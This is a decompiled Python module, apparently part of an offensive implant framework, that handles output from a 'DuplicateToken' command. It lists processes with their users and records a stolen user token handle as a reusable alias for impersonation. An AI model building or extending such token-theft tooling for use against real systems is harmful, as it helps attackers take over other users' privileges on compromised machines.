# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_DuplicateToken_DataHandler.py


def DataHandlerMain(namespace, InputFilename, OutputFilename):
    import mcl.imports
    import mcl.data.Input
    import mcl.data.Output
    import mcl.data.env
    import mcl.msgtype
    import mcl.status
    import mcl.target
    import mcl.object.Message
    mcl.imports.ImportNamesWithNamespace(namespace, 'mca.security.cmd.duplicatetoken', globals())
    input = mcl.data.Input.GetInput(InputFilename)
    output = mcl.data.Output.StartOutput(OutputFilename, input)
    output.Start('DuplicateToken', 'duplicatetoken', [])
    msg = mcl.object.Message.DemarshalMessage(input.GetData())
    if input.GetStatus() != mcl.status.MCL_SUCCESS:
        errorMsg = msg.FindMessage(mcl.object.Message.MSG_KEY_RESULT_ERROR)
        moduleError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_MODULE)
        osError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_OS)
        output.RecordModuleError(moduleError, osError, errorStrings)
        output.EndWithStatus(input.GetStatus())
        return True
    else:
        if input.GetMessageType() == mcl.msgtype.DUPLICATETOKEN_LIST:
            return _handleDuplicateTokenList(msg, output)
        if input.GetMessageType() == mcl.msgtype.DUPLICATETOKEN_STEAL:
            return _handleDuplicateTokenSteal(msg, output)
        output.RecordError('Unhandled message type (%u)' % input.GetMessageType())
        output.EndWithStatus(mcl.target.CALL_FAILED)
        return False


def _handleDuplicateTokenList(msg, output):
    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    xml.Start('ProcessList')
    while msg.GetNumRetrieved() < msg.GetCount():
        if mcl.CheckForStop():
            output.EndWithStatus(mcl.target.CALL_FAILED)
            return False
        item = ResultList()
        item.Demarshal(msg)
        sub = xml.AddSubElement('Process')
        sub.AddAttribute('id', '%u' % item.id)
        sub.AddAttribute('name', item.name)
        sub.AddAttribute('user', item.user)

    output.RecordXml(xml)
    output.EndWithStatus(mcl.target.CALL_SUCCEEDED)
    return True


def _handleDuplicateTokenSteal(msg, output):
    import mcl.data.env
    if msg.GetCount() == 0:
        output.EndWithStatus(mcl.target.CALL_SUCCEEDED)
        return True
    info = ResultSteal()
    info.Demarshal(msg)
    try:
        alias = 'proc%u' % info.id
        mcl.data.env.SetValue('_USER_%s' % alias, '0x%08x' % info.hUser, globalValue=True)
        aliasSet = True
    except:
        output.RecordError('Failed to set alias for user')
        aliasSet = False

    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    xml.Start('Logon')
    xml.AddAttribute('handle', '0x%08x' % info.hUser)
    if aliasSet:
        xml.AddAttribute('alias', alias)
    output.RecordXml(xml)
    output.GoToBackground()
    output.End()
    return True


if __name__ == '__main__':
    import sys
    try:
        namespace, InputFilename, OutputFilename = sys.argv[1:]
    except:
        print '%s <namespace> <input filename> <output filename>' % sys.argv[0]
        sys.exit(1)

    if DataHandlerMain(namespace, InputFilename, OutputFilename) != True:
        sys.exit(-1)